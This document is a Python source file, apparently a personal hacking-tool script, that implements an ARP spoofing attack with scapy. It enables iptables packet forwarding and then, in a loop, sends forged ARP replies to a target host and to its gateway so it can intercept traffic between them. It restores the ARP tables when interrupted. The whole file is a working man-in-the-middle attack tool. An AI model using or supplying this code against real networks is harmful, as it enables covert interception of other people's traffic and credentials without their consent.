import scapy.all as scapy
import argparse
import time
import subprocess


class ARPSpoof:
    def __init__(self, target_ip, gateway_ip):
        self.target_ip = target_ip
        self.gateway_ip = gateway_ip

    def packet_forwarding(self, switch):
        if switch == "enable":
            subprocess.call(["iptables", "--policy", "FORWARD", "ACCEPT"])
            # print("[+] Packet forwarding set to ACCEPT")

        if switch == "disable":
            subprocess.call(["iptables", "--policy", "FORWARD", "DROP"])
            # print("[+] Packet forwarding reverted to DROP")

    def get_mac(self, ip):
        arp_request = scapy.ARP(pdst=ip)  # Requests IP for MAC addr (who has...)
        # create Ethernet frame and send to the dst address
        broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
        # Combine individual requests with ether frame
        arp_r_broadcast = broadcast / arp_request
        active_clients = scapy.srp(arp_r_broadcast, timeout=3, verbose=False)[
            0]  # Send and Receive the frames

        """identify right client & return its mac"""
        if not active_clients:
            print("\n-> Invalid IP addr: ", ip)
            exit()
        for client in active_clients:
            if client[1].psrc == ip:
                mac = client[1].hwsrc
                return mac


    def arp_spoof(self, target_ip, gateway_ip):
        target_mac = self.get_mac(target_ip)
        spoofed_packet = scapy.ARP(
            op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip)
        scapy.send(spoofed_packet, verbose=False)

    def revert(self, dst_ip, src_ip):  # *s_mac is the optional arg for reverting
        dst_mac = self.get_mac(dst_ip)
        src_mac = self.get_mac(src_ip)
        spoofed_packet = scapy.ARP(
            op=2, pdst=dst_ip, hwdst=dst_mac, psrc=src_ip, hwsrc=src_mac)
        scapy.send(spoofed_packet, count=3, verbose=False)

    def start(self):
        packets_count = 0
        try:
            try:
                self.packet_forwarding("enable")
            except Exception:
                print("IP Forwarding exception.")
            print("\nStarting ARP Spoof...")
            while True:
                # Send spoofed response packet to target
                self.arp_spoof(self.target_ip, self.gateway_ip)
                # Send spoofed response packet to gateway.
                self.arp_spoof(self.gateway_ip, self.target_ip)
                packets_count += 2
                print(f"[+] Packets sent: {packets_count}",
                      end="\r")  # Dynamic printing
                time.sleep(1)
        except KeyboardInterrupt:
            print("\n[-] Reverting the ARP Table")
            self.revert(self.target_ip, self.gateway_ip)  # Target revert
            self.revert(self.gateway_ip, self.target_ip)  # Gateway revert
            self.packet_forwarding("disable")
            print("[+] Reverted successfully.")
            print("\n[!] Program terminated")
